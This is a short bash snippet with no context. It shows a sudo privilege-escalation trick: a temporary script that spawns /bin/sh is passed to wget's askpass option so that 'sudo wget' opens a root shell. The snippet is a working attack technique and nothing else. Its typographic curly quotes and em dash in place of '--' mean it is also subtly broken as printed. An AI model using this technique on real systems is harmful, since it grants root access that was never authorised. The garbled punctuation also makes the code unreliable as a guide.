```bash
TF=$(mktemp)

chmod +x $TF 

echo -e ‘#!/bin/sh\n/bin/sh 1>&0’ >$TF

sudo wget —use-askpass=$TF 0
```
